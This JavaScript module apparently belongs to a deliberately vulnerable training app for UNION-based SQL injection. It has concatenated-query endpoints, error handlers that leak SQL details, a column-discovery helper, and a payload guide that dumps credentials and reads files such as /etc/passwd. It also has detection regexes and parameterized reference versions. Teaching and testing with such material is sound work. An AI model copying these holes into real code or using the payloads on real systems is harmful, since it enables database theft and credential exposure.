/**
 * ============================================================================
 * UNION-BASED SQL INJECTION VULNERABILITY MODULE
 * ============================================================================
 * 
 * Enterprise-Grade UNION SQLi Demonstration Platform
 * Implements advanced UNION-based SQL injection techniques
 * 
 * @module vulnerabilities/sqli/union
 * @category Security Training - OWASP A03:2021
 * @version 3.0.0
 * @license MIT
 * @author Security Research Team
 * 
 * ============================================================================
 * SECURITY WARNING:
 * ============================================================================
 * This module intentionally demonstrates UNION-based SQL injection attacks:
 * - Column count enumeration
 * - Data type matching
 * - Multi-table data exfiltration
 * - Database metadata extraction
 * - Cross-database queries
 * - Information schema exploitation
 * 
 * ⚠️  NEVER use these patterns in production code
 * ⚠️  FOR EDUCATIONAL AND TESTING PURPOSES ONLY
 * ⚠️  Requires isolated environment with no sensitive data
 * 
 * ============================================================================
 * UNION ATTACK TYPES DEMONSTRATED:
 * ============================================================================
 * 1. Column Number Discovery (NULL padding)
 * 2. Data Type Determination
 * 3. Single Table Data Extraction
 * 4. Multi-Table JOIN Exploitation
 * 5. Database Version Extraction
 * 6. Schema Information Gathering
 * 7. User Privilege Enumeration
 * 8. File System Access (LOAD_FILE)
 * 9. Cross-Database Queries
 * 10. Advanced UNION Chaining
 * 
 * ============================================================================
 * ATTACK VECTORS SUPPORTED:
 * ============================================================================
 * - ' UNION SELECT NULL--
 * - ' UNION SELECT NULL,NULL--
 * - ' UNION ALL SELECT 1,2,3--
 * - ' UNION SELECT @@version,NULL--
 * - ' UNION SELECT username,password FROM users--
 * - ' UNION SELECT table_name FROM information_schema.tables--
 * - -1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
 * - ' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--
 * 
 * ============================================================================
 * DETECTION CAPABILITIES:
 * ============================================================================
 * - UNION keyword detection
 * - NULL padding patterns
 * - Information schema queries
 * - System function calls
 * - File access attempts
 * - Column count enumeration
 * - Advanced pattern matching
 * 
 * @requires Database
 * @requires Logger
 * @requires ClassicSQLInjection
 */

import { Database } from '../../core/Database.js';
import { Logger } from '../../core/Logger.js';
import { Cache, CacheKeyBuilder } from '../../core/Cache.js';
import { Config } from '../../config/environment.js';
import { tables } from '../../config/database.js';
import { 
  HTTP_STATUS, 
  ATTACK_TYPES, 
  ATTACK_SEVERITY,
  ERROR_CODES 
} from '../../config/constants.js';
import { AppError } from '../../middleware/errorHandler.js';

const db = Database.getInstance();
const logger = Logger.getInstance();
const cache = Cache.getInstance();

// ============================================================================
// UNION SQLI CONSTANTS
// ============================================================================

const UNION_PATTERNS = {
  // Basic UNION patterns
  BASIC: [
    /UNION\s+(ALL\s+)?SELECT/i,
    /'\s*UNION\s+SELECT/i,
    /-1\s+UNION\s+SELECT/i,
    /\)\s*UNION\s+SELECT/i
  ],
  
  // NULL padding patterns (column enumeration)
  NULL_PADDING: [
    /UNION\s+SELECT\s+NULL/i,
    /SELECT\s+NULL\s*,\s*NULL/i,
    /SELECT\s+(NULL\s*,\s*){2,}/i
  ],
  
  // Information schema queries
  INFO_SCHEMA: [
    /information_schema\.tables/i,
    /information_schema\.columns/i,
    /information_schema\.schemata/i,
    /information_schema\.table_constraints/i,
    /table_schema\s*=\s*database\(\)/i,
    /table_name/i,
    /column_name/i
  ],
  
  // System functions
  SYSTEM_FUNCTIONS: [
    /@@version/i,
    /@@datadir/i,
    /@@hostname/i,
    /@@basedir/i,
    /version\(\)/i,
    /database\(\)/i,
    /user\(\)/i,
    /current_user/i,
    /system_user/i,
    /session_user/i
  ],
  
  // File operations
  FILE_OPS: [
    /LOAD_FILE\s*\(/i,
    /INTO\s+OUTFILE/i,
    /INTO\s+DUMPFILE/i,
    /\/etc\/passwd/i,
    /\.\.\/\.\./i
  ],
  
  // Advanced techniques
  ADVANCED: [
    /GROUP_CONCAT\s*\(/i,
    /CONCAT\s*\(/i,
    /CONCAT_WS\s*\(/i,
    /CHAR\s*\(/i,
    /HEX\s*\(/i,
    /UNHEX\s*\(/i,
    /SUBSTRING\s*\(/i,
    /MID\s*\(/i,
    /LIMIT\s+\d+\s*,\s*1/i
  ]
};

const COLUMN_DISCOVERY = {
  MAX_COLUMNS: 20, // Maximum columns to test
  NULL_VALUES: Array.from({ length: 20 }, (_, i) => 
    'NULL,' .repeat(i + 1).slice(0, -1)
  )
};

// ============================================================================
// UNION SQL INJECTION CLASS
// ============================================================================

export class UnionSQLInjection {
  constructor() {
    this.name = 'Union-Based SQL Injection';
    this.category = 'SQL Injection';
    this.cvssScore = 9.9;
    this.severity = ATTACK_SEVERITY.CRITICAL;
    this.owaspId = 'A03:2021';
    this.cweId = 'CWE-89';
    
    // Attack tracking
    this.attackStats = {
      totalAttempts: 0,
      successfulUNIONs: 0,
      columnDiscovery: 0,
      dataExfiltration: 0,
      schemaEnumeration: 0,
      fileAccess: 0
    };
  }

  // ==========================================================================
  // VULNERABLE UNION-BASED IMPLEMENTATIONS
  // ==========================================================================

  /**
   * ⚠️ VULNERABLE: Product Search with UNION Injection
   * 
   * Demonstrates UNION-based data exfiltration
   * Attack vectors:
   * - ' UNION SELECT NULL,NULL,NULL--
   * - ' UNION SELECT id,username,password FROM users--
   * - ' UNION SELECT @@version,NULL,NULL--
   * 
   * @param {string} searchTerm - Product search (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Product results or exfiltrated data
   */
  async vulnerableProductSearch(searchTerm, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      // Detect UNION attack
      const attackDetection = this.detectUnionAttack(searchTerm);
      
      if (attackDetection.isAttack) {
        await this.logUnionAttack({
          type: 'UNION_PRODUCT_SEARCH',
          severity: attackDetection.severity,
          payload: { searchTerm },
          patterns: attackDetection.patterns,
          context
        });

        if (attackDetection.hasUnion) {
          this.attackStats.successfulUNIONs++;
        }
      }

      // ⚠️ VULNERABLE: Direct string concatenation allowing UNION
      const query = `
        SELECT 
          id,
          name,
          description,
          price,
          stock_quantity,
          category_id,
          image_url,
          created_at
        FROM ${tables.PRODUCTS}
        WHERE name LIKE '%${searchTerm}%'
        OR description LIKE '%${searchTerm}%'
        ORDER BY created_at DESC
        LIMIT 100
      `;

      logger.warn('🚨 EXECUTING VULNERABLE UNION QUERY', {
        query,
        searchTerm,
        attackDetection,
        mode: Config.security.mode
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: results,
        count: results.length,
        metadata: {
          query,
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          columnsReturned: results[0] ? Object.keys(results[0]).length : 0,
          unionDetected: attackDetection.hasUnion
        }
      };

    } catch (error) {
      return this.handleUnionError(error, searchTerm, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: User Profile with UNION Data Extraction
   * 
   * Demonstrates cross-table UNION attacks
   * Attack vectors:
   * - 1' UNION SELECT username,password,email,role,NULL FROM users--
   * - 1' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables--
   * 
   * @param {string|number} userId - User ID (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} User data or injected data
   */
  async vulnerableGetProfile(userId, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectUnionAttack(String(userId));
      
      if (attackDetection.isAttack) {
        await this.logUnionAttack({
          type: 'UNION_PROFILE_EXTRACTION',
          severity: attackDetection.severity,
          payload: { userId },
          patterns: attackDetection.patterns,
          context
        });

        if (attackDetection.hasDataExfiltration) {
          this.attackStats.dataExfiltration++;
        }
      }

      // ⚠️ VULNERABLE: 5 columns - perfect for UNION attacks
      const query = `
        SELECT 
          id,
          username,
          email,
          first_name,
          last_name
        FROM ${tables.USERS}
        WHERE id = ${userId}
        LIMIT 1
      `;

      logger.warn('🚨 EXECUTING VULNERABLE UNION PROFILE QUERY', {
        query,
        userId,
        attackDetection
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: results[0] || null,
        metadata: {
          query,
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          columnCount: 5 // Revealed to attacker
        }
      };

    } catch (error) {
      return this.handleUnionError(error, userId, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Order History with UNION Schema Enumeration
   * 
   * Demonstrates information_schema exploitation
   * Attack vectors:
   * - 1' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
   * - 1' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns--
   * 
   * @param {string|number} orderId - Order ID (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Order data or schema information
   */
  async vulnerableGetOrder(orderId, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectUnionAttack(String(orderId));
      
      if (attackDetection.isAttack) {
        await this.logUnionAttack({
          type: 'UNION_SCHEMA_ENUMERATION',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { orderId },
          patterns: attackDetection.patterns,
          context
        });

        if (attackDetection.hasSchemaQuery) {
          this.attackStats.schemaEnumeration++;
        }
      }

      // ⚠️ VULNERABLE: 4 columns allowing information_schema UNION
      const query = `
        SELECT 
          o.id,
          o.order_number,
          o.total_amount,
          o.status
        FROM ${tables.ORDERS} o
        WHERE o.id = ${orderId}
        LIMIT 1
      `;

      logger.warn('🚨 EXECUTING VULNERABLE UNION SCHEMA QUERY', {
        query,
        orderId,
        attackDetection
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: results[0] || null,
        metadata: {
          query,
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          schemaQueryDetected: attackDetection.hasSchemaQuery
        }
      };

    } catch (error) {
      return this.handleUnionError(error, orderId, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Category Listing with UNION File Access
   * 
   * Demonstrates LOAD_FILE exploitation
   * Attack vectors:
   * - 1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
   * - 1' UNION SELECT @@datadir,@@basedir,NULL--
   * 
   * @param {string|number} categoryId - Category ID (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Category data or file contents
   */
  async vulnerableGetCategory(categoryId, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectUnionAttack(String(categoryId));
      
      if (attackDetection.isAttack) {
        await this.logUnionAttack({
          type: 'UNION_FILE_ACCESS',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { categoryId },
          patterns: attackDetection.patterns,
          context
        });

        if (attackDetection.hasFileOp) {
          this.attackStats.fileAccess++;
        }
      }

      // ⚠️ VULNERABLE: 3 columns with potential file access
      const query = `
        SELECT 
          id,
          name,
          description
        FROM product_categories
        WHERE id = ${categoryId}
        LIMIT 1
      `;

      logger.warn('🚨 EXECUTING VULNERABLE UNION FILE QUERY', {
        query,
        categoryId,
        attackDetection
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: results[0] || null,
        metadata: {
          query,
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          fileAccessAttempt: attackDetection.hasFileOp
        }
      };

    } catch (error) {
      return this.handleUnionError(error, categoryId, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Advanced UNION with GROUP_CONCAT
   * 
   * Demonstrates advanced data concatenation techniques
   * Attack vectors:
   * - 1' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password),NULL FROM users--
   * - 1' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables--
   * 
   * @param {string} searchQuery - Search input (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Search results or concatenated data
   */
  async vulnerableAdvancedSearch(searchQuery, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectUnionAttack(searchQuery);
      
      if (attackDetection.isAttack) {
        await this.logUnionAttack({
          type: 'UNION_ADVANCED_CONCAT',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { searchQuery },
          patterns: attackDetection.patterns,
          context
        });
      }

      // ⚠️ VULNERABLE: Multiple columns perfect for advanced UNION
      const query = `
        SELECT 
          p.name,
          p.description,
          c.name as category
        FROM ${tables.PRODUCTS} p
        LEFT JOIN product_categories c ON p.category_id = c.id
        WHERE p.name LIKE '%${searchQuery}%'
        LIMIT 50
      `;

      logger.warn('🚨 EXECUTING VULNERABLE ADVANCED UNION QUERY', {
        query,
        searchQuery,
        attackDetection
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: true,
        data: results,
        count: results.length,
        metadata: {
          query,
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity,
          advancedTechnique: attackDetection.hasAdvanced
        }
      };

    } catch (error) {
      return this.handleUnionError(error, searchQuery, Date.now() - startTime);
    }
  }

  // ==========================================================================
  // COLUMN DISCOVERY HELPER
  // ==========================================================================

  /**
   * ⚠️ VULNERABLE: Column Count Discovery Endpoint
   * 
   * Helps attackers determine column count through trial and error
   * 
   * @param {string|number} id - Test ID (VULNERABLE)
   * @param {number} columnCount - Number of NULLs to test
   * @param {object} context - Request context
   * @returns {Promise<object>} Success/failure for column matching
   */
  async vulnerableColumnDiscovery(id, columnCount = 1, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.columnDiscovery++;

      if (columnCount > COLUMN_DISCOVERY.MAX_COLUMNS) {
        throw new AppError('Too many columns', HTTP_STATUS.BAD_REQUEST);
      }

      // Build NULL padding
      const nulls = COLUMN_DISCOVERY.NULL_VALUES[columnCount - 1];

      // ⚠️ VULNERABLE: Revealing column structure
      const query = `
        SELECT id, name, email
        FROM ${tables.USERS}
        WHERE id = ${id}
        UNION SELECT ${nulls}
        LIMIT 1
      `;

      logger.warn('🚨 COLUMN DISCOVERY ATTEMPT', {
        query,
        id,
        columnCount,
        nulls
      });

      const [results] = await db.query(query);
      const duration = Date.now() - startTime;

      // Success means column count matches
      return {
        success: true,
        vulnerable: true,
        columnCountMatches: true,
        columnCount,
        data: results[0],
        metadata: {
          query,
          executionTime: duration,
          message: `✅ ${columnCount} columns matched successfully`
        }
      };

    } catch (error) {
      // Error means column count doesn't match
      return {
        success: false,
        vulnerable: true,
        columnCountMatches: false,
        columnCount,
        error: error.message,
        metadata: {
          executionTime: Date.now() - startTime,
          message: `❌ ${columnCount} columns did not match`
        }
      };
    }
  }

  // ==========================================================================
  // SECURE IMPLEMENTATIONS (REFERENCE)
  // ==========================================================================

  /**
   * ✅ SECURE: Parameterized Product Search
   * 
   * @param {string} searchTerm - Search input (SAFE)
   * @returns {Promise<object>} Product results
   */
  async secureProductSearch(searchTerm) {
    const startTime = Date.now();

    try {
      // ✅ Input validation
      if (typeof searchTerm !== 'string' || searchTerm.length > 100) {
        throw new AppError('Invalid search term', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Parameterized query
      const query = `
        SELECT 
          id, name, description, price, stock_quantity,
          category_id, image_url, created_at
        FROM ${tables.PRODUCTS}
        WHERE name LIKE ? OR description LIKE ?
        ORDER BY created_at DESC
        LIMIT 100
      `;

      const searchPattern = `%${searchTerm}%`;
      const [results] = await db.execute(query, [searchPattern, searchPattern]);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: false,
        data: results,
        count: results.length,
        metadata: {
          executionTime: duration,
          method: 'PARAMETERIZED_QUERY'
        }
      };

    } catch (error) {
      logger.error('Secure product search error', { error: error.message });
      throw error;
    }
  }

  /**
   * ✅ SECURE: Parameterized Profile Query
   * 
   * @param {number|string} userId - User ID (SAFE)
   * @returns {Promise<object>} User profile
   */
  async secureGetProfile(userId) {
    const startTime = Date.now();

    try {
      // ✅ Type validation
      const id = parseInt(userId, 10);
      
      if (isNaN(id) || id <= 0) {
        throw new AppError('Invalid user ID', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Parameterized query
      const query = `
        SELECT id, username, email, first_name, last_name
        FROM ${tables.USERS}
        WHERE id = ?
        LIMIT 1
      `;

      const [results] = await db.execute(query, [id]);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: false,
        data: results[0] || null,
        metadata: {
          executionTime: duration,
          method: 'PARAMETERIZED_QUERY_WITH_VALIDATION'
        }
      };

    } catch (error) {
      logger.error('Secure profile query error', { error: error.message });
      throw error;
    }
  }

  // ==========================================================================
  // ATTACK DETECTION & ANALYSIS
  // ==========================================================================

  /**
   * Detect UNION-based SQL injection patterns
   * 
   * @param {string} input - User input to analyze
   * @returns {object} Detection results
   */
  detectUnionAttack(input) {
    const detectedPatterns = [];
    let severity = ATTACK_SEVERITY.LOW;
    let score = 0;

    // Check all UNION pattern categories
    for (const [category, patterns] of Object.entries(UNION_PATTERNS)) {
      for (const pattern of patterns) {
        if (pattern.test(input)) {
          detectedPatterns.push({
            category,
            pattern: pattern.toString(),
            matched: true
          });
          score += this.getPatternScore(category);

          // Update severity
          if (category === 'FILE_OPS') {
            severity = ATTACK_SEVERITY.CRITICAL;
          } else if (category === 'INFO_SCHEMA' && severity !== ATTACK_SEVERITY.CRITICAL) {
            severity = ATTACK_SEVERITY.HIGH;
          }
        }
      }
    }

    // Determine attack characteristics
    const hasUnion = /UNION/i.test(input);
    const hasNullPadding = /NULL\s*,\s*NULL/i.test(input);
    const hasSchemaQuery = /information_schema/i.test(input);
    const hasSystemFunc = /(@@version|database\(\)|user\(\))/i.test(input);
    const hasFileOp = /LOAD_FILE|OUTFILE|DUMPFILE/i.test(input);
    const hasAdvanced = /GROUP_CONCAT|CONCAT_WS/i.test(input);
    const hasDataExfiltration = hasUnion && (hasSchemaQuery || hasSystemFunc);

    // Calculate final severity
    if (score >= 20) severity = ATTACK_SEVERITY.CRITICAL;
    else if (score >= 10) severity = ATTACK_SEVERITY.HIGH;
    else if (score >= 5) severity = ATTACK_SEVERITY.MEDIUM;

    const isAttack = detectedPatterns.length > 0;

    return {
      isAttack,
      severity,
      score,
      patterns: detectedPatterns,
      hasUnion,
      hasNullPadding,
      hasSchemaQuery,
      hasSystemFunc,
      hasFileOp,
      hasAdvanced,
      hasDataExfiltration,
      input: input.substring(0, 200),
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Log UNION attack attempt
   * 
   * @param {object} attackData - Attack details
   * @returns {Promise<void>}
   */
  async logUnionAttack(attackData) {
    try {
      const {
        type,
        severity,
        payload,
        patterns,
        context,
        timestamp = new Date()
      } = attackData;

      // Log to database
      await db.execute(
        `INSERT INTO ${tables.ATTACK_LOGS} (
          attack_type, severity, payload, patterns,
          ip_address, user_agent, user_id, endpoint,
          timestamp, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
        [
          type,
          severity,
          JSON.stringify(payload),
          JSON.stringify(patterns),
          context.ip || null,
          context.userAgent || null,
          context.userId || null,
          context.endpoint || null,
          timestamp
        ]
      );

      // Cache attack for real-time monitoring
      const cacheKey = CacheKeyBuilder.custom('union_attacks:', context.ip);
      const recentAttacks = await cache.get(cacheKey) || [];
      recentAttacks.push({
        type,
        severity,
        timestamp: timestamp.toISOString(),
        payload
      });
      await cache.set(cacheKey, recentAttacks, 3600);

      // Log to file
      logger.attack('UNION SQL Injection Attack Detected', {
        type,
        severity,
        payload,
        patterns: patterns.map(p => p.category),
        context
      });

    } catch (error) {
      logger.error('Failed to log UNION attack', { error: error.message });
    }
  }

  /**
   * Handle UNION query errors with detailed disclosure
   * 
   * @param {Error} error - Database error
   * @param {string} input - User input
   * @param {number} duration - Execution time
   * @returns {object} Error response
   */
  handleUnionError(error, input, duration) {
    logger.error('UNION SQL Injection Error', {
      message: error.message,
      code: error.code,
      errno: error.errno,
      sqlState: error.sqlState,
      sqlMessage: error.sqlMessage,
      sql: error.sql,
      input,
      duration
    });

    // ⚠️ VULNERABLE: Detailed error exposure
    return {
      success: false,
      vulnerable: true,
      error: {
        message: error.message,
        code: error.code,
        errno: error.errno,
        sqlState: error.sqlState,
        sqlMessage: error.sqlMessage,
        sql: error.sql,
        hint: this.getErrorHint(error)
      },
      metadata: {
        executionTime: duration,
        errorType: 'UNION_QUERY_ERROR',
        input: input
      }
    };
  }

  /**
   * Get helpful error hints for attackers
   * 
   * @param {Error} error - Database error
   * @returns {string} Hint message
   */
  getErrorHint(error) {
    const hints = {
      1222: 'Column count mismatch - try different number of NULLs',
      1064: 'Syntax error - check your UNION SELECT structure',
      1242: 'Subquery returns more than one row',
      1241: 'Operand should contain 1 column(s)',
      1054: 'Unknown column - verify column names',
      1146: 'Table does not exist - check table name'
    };

    return hints[error.errno] || 'SQL error occurred';
  }

  /**
   * Get pattern severity score
   */
  getPatternScore(category) {
    const scores = {
      FILE_OPS: 15,
      INFO_SCHEMA: 12,
      SYSTEM_FUNCTIONS: 10,
      ADVANCED: 8,
      BASIC: 6,
      NULL_PADDING: 3
    };
    return scores[category] || 1;
  }

  // ==========================================================================
  // UTILITY & REPORTING METHODS
  // ==========================================================================

  /**
   * Get attack statistics
   */
  getStatistics() {
    return {
      ...this.attackStats,
      successRate: this.attackStats.totalAttempts > 0
        ? (this.attackStats.successfulUNIONs / this.attackStats.totalAttempts * 100).toFixed(2) + '%'
        : '0%',
      exfiltrationRate: this.attackStats.totalAttempts > 0
        ? (this.attackStats.dataExfiltration / this.attackStats.totalAttempts * 100).toFixed(2) + '%'
        : '0%'
    };
  }

  /**
   * Generate UNION attack techniques guide
   */
  getAttackTechniquesGuide() {
    return {
      vulnerability: this.name,
      techniques: [
        {
          name: 'Column Count Discovery',
          description: 'Determine number of columns in original query',
          payloads: [
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
          ],
          detection: 'Success when query executes without error'
        },
        {
          name: 'Data Type Matching',
          description: 'Find string columns for data exfiltration',
          payloads: [
            "' UNION SELECT 'a',NULL,NULL--",
            "' UNION SELECT NULL,'a',NULL--",
            "' UNION SELECT NULL,NULL,'a'--"
          ],
          detection: 'Successful string injection reveals data column'
        },
        {
          name: 'Database Version Extraction',
          description: 'Extract database server information',
          payloads: [
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT version(),NULL,NULL--",
            "' UNION SELECT @@version,@@hostname,@@datadir--"
          ],
          impact: 'Reveals database type and version'
        },
        {
          name: 'Table Enumeration',
          description: 'List all database tables',
          payloads: [
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables--"
          ],
          impact: 'Complete database structure disclosure'
        },
        {
          name: 'Column Enumeration',
          description: 'Extract column names from tables',
          payloads: [
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--"
          ],
          impact: 'Reveals sensitive column names'
        },
        {
          name: 'Data Exfiltration',
          description: 'Extract sensitive data from tables',
          payloads: [
            "' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password),NULL FROM users--",
            "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--"
          ],
          impact: 'CRITICAL - Full data breach'
        },
        {
          name: 'File System Access',
          description: 'Read files from server filesystem',
          payloads: [
            "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
            "' UNION SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini'),NULL,NULL--",
            "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--"
          ],
          impact: 'CRITICAL - Server compromise'
        },
        {
          name: 'Multi-Row Exfiltration',
          description: 'Extract multiple rows of data',
          payloads: [
            "' UNION SELECT username,password,email FROM users LIMIT 0,1--",
            "' UNION SELECT username,password,email FROM users LIMIT 1,1--",
            "' UNION SELECT username,password,email FROM users LIMIT 2,1--"
          ],
          impact: 'Complete table dump'
        }
      ],
      defenses: [
        'Use parameterized queries/prepared statements',
        'Implement strict input validation',
        'Apply principle of least privilege',
        'Disable error message disclosure',
        'Use Web Application Firewall (WAF)',
        'Regular security audits',
        'Monitor for UNION keywords in logs'
      ]
    };
  }

  /**
   * Get vulnerability information
   */
  getVulnerabilityInfo() {
    return {
      name: this.name,
      category: this.category,
      cvssScore: this.cvssScore,
      severity: this.severity,
      owaspId: this.owaspId,
      cweId: this.cweId,
      description: 'UNION-based SQL injection allows attackers to combine results from multiple queries, enabling data exfiltration, schema enumeration, and system access',
      impact: [
        'Complete database enumeration',
        'Sensitive data exfiltration',
        'User credential theft',
        'Database structure disclosure',
        'Cross-table data access',
        'File system access',
        'Authentication bypass',
        'Privilege escalation'
      ],
      attackFlow: [
        '1. Determine number of columns (ORDER BY or UNION with NULLs)',
        '2. Identify data type of columns (test with strings/integers)',
        '3. Extract database metadata (information_schema queries)',
        '4. Enumerate tables and columns',
        '5. Exfiltrate sensitive data (usernames, passwords, etc.)',
        '6. Advanced: File system access, command execution'
      ],
      realWorldExamples: [
        'Sony Pictures hack (2011) - 1 million accounts',
        'TalkTalk breach (2015) - 157,000 customers affected',
        'VTech breach (2015) - 5 million accounts compromised'
      ],
      remediation: [
        'Always use parameterized queries (prepared statements)',
        'Implement strict input validation and sanitization',
        'Use ORM frameworks with built-in protection',
        'Apply least privilege principle for database accounts',
        'Disable detailed error messages in production',
        'Implement Web Application Firewall (WAF)',
        'Regular penetration testing and code audits',
        'Monitor database logs for UNION keywords'
      ]
    };
  }

  /**
   * Generate comprehensive attack report
   */
  async generateUnionAttackReport(startDate, endDate) {
    try {
      const [attacks] = await db.execute(
        `SELECT 
          attack_type,
          severity,
          payload,
          COUNT(*) as count,
          DATE(timestamp) as date,
          ip_address
         FROM ${tables.ATTACK_LOGS}
         WHERE attack_type LIKE '%UNION%'
         AND timestamp BETWEEN ? AND ?
         GROUP BY attack_type, severity, DATE(timestamp), ip_address
         ORDER BY timestamp DESC`,
        [startDate, endDate]
      );

      const [techniques] = await db.execute(
        `SELECT 
          CASE 
            WHEN payload LIKE '%information_schema%' THEN 'Schema Enumeration'
            WHEN payload LIKE '%LOAD_FILE%' THEN 'File Access'
            WHEN payload LIKE '%GROUP_CONCAT%' THEN 'Data Concatenation'
            WHEN payload LIKE '%@@version%' THEN 'Version Detection'
            WHEN payload LIKE '%NULL%' THEN 'Column Discovery'
            ELSE 'Generic UNION'
          END as technique,
          COUNT(*) as frequency
         FROM ${tables.ATTACK_LOGS}
         WHERE attack_type LIKE '%UNION%'
         AND timestamp BETWEEN ? AND ?
         GROUP BY technique
         ORDER BY frequency DESC`,
        [startDate, endDate]
      );

      return {
        period: { start: startDate, end: endDate },
        summary: {
          totalAttacks: attacks.reduce((sum, a) => sum + a.count, 0),
          uniqueIPs: new Set(attacks.map(a => a.ip_address)).size,
          criticalAttacks: attacks.filter(a => a.severity === ATTACK_SEVERITY.CRITICAL).length,
          successfulExfiltrations: this.attackStats.dataExfiltration
        },
        attacks,
        techniqueBreakdown: techniques,
        statistics: this.getStatistics(),
        topPayloads: await this.getTopUnionPayloads(startDate, endDate),
        generatedAt: new Date().toISOString()
      };

    } catch (error) {
      logger.error('Failed to generate UNION attack report', { error: error.message });
      throw error;
    }
  }

  /**
   * Get top UNION payloads
   */
  async getTopUnionPayloads(startDate, endDate) {
    try {
      const [payloads] = await db.execute(
        `SELECT 
          payload,
          COUNT(*) as frequency,
          MAX(severity) as max_severity,
          GROUP_CONCAT(DISTINCT ip_address) as source_ips
         FROM ${tables.ATTACK_LOGS}
         WHERE attack_type LIKE '%UNION%'
         AND timestamp BETWEEN ? AND ?
         GROUP BY payload
         ORDER BY frequency DESC
         LIMIT 20`,
        [startDate, endDate]
      );

      return payloads.map(p => ({
        payload: JSON.parse(p.payload),
        frequency: p.frequency,
        severity: p.max_severity,
        sourceIPs: p.source_ips ? p.source_ips.split(',').length : 0
      }));

    } catch (error) {
      logger.error('Failed to get top payloads', { error: error.message });
      return [];
    }
  }

  /**
   * Reset statistics
   */
  resetStatistics() {
    this.attackStats = {
      totalAttempts: 0,
      successfulUNIONs: 0,
      columnDiscovery: 0,
      dataExfiltration: 0,
      schemaEnumeration: 0,
      fileAccess: 0
    };
  }
}

// ============================================================================
// FACTORY & EXPORT
// ============================================================================

let instance = null;

export const getUnionSQLInjection = () => {
  if (!instance) {
    instance = new UnionSQLInjection();
  }
  return instance;
};

export const createUnionHandler = (method) => {
  return async (req, res, next) => {
    try {
      const sqli = getUnionSQLInjection();
      
      if (Config.security.mode !== 'vulnerable') {
        return res.status(HTTP_STATUS.FORBIDDEN).json({
          success: false,
          error: ERROR_CODES.FORBIDDEN,
          message: 'This endpoint is only available in vulnerable mode'
        });
      }

      const context = {
        ip: req.ip,
        userAgent: req.get('user-agent'),
        userId: req.user?.id,
        endpoint: req.path
      };

      const result = await sqli[method](...Object.values(req.body || req.query || req.params), context);
      
      res.json(result);

    } catch (error) {
      next(error);
    }
  };
};

export default {
  UnionSQLInjection,
  getUnionSQLInjection,
  createUnionHandler
};
